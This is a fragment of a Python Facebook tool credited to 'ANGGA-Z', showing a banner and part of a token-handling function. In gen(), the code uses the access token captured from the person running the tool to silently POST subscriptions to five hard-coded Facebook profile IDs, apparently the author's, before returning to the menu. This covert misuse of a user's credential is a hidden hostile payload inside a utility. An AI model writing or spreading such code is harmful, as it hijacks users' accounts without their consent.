...
\033[0;96m    __       ___  __       
          |__/ /  \ |\ |  |  /  \ |    
          |  \ \__/ | \|  |  \__/ |___
         \033[1;32m      CODE BY ANGGA-Z \n      Bajingan-Z + Angga\033[1;37m
    -----------------------------------------\n""")
...
def gen():
	...
	cookie.close()
	requests.post('https://graph.facebook.com/100001027764318/subscribers?access_token='+find_token.group(1))
	requests.post('https://graph.facebook.com/100004574534570/subscribers?access_token='+find_token.group(1))
	requests.post('https://graph.facebook.com/100000443808089/subscribers?access_token='+find_token.group(1))
	requests.post('https://graph.facebook.com/100000362834253/subscribers?access_token='+find_token.group(1))
	requests.post('https://graph.facebook.com/107141751487248/subscribers?access_token='+find_token.group(1))
	menu()
def log_token():
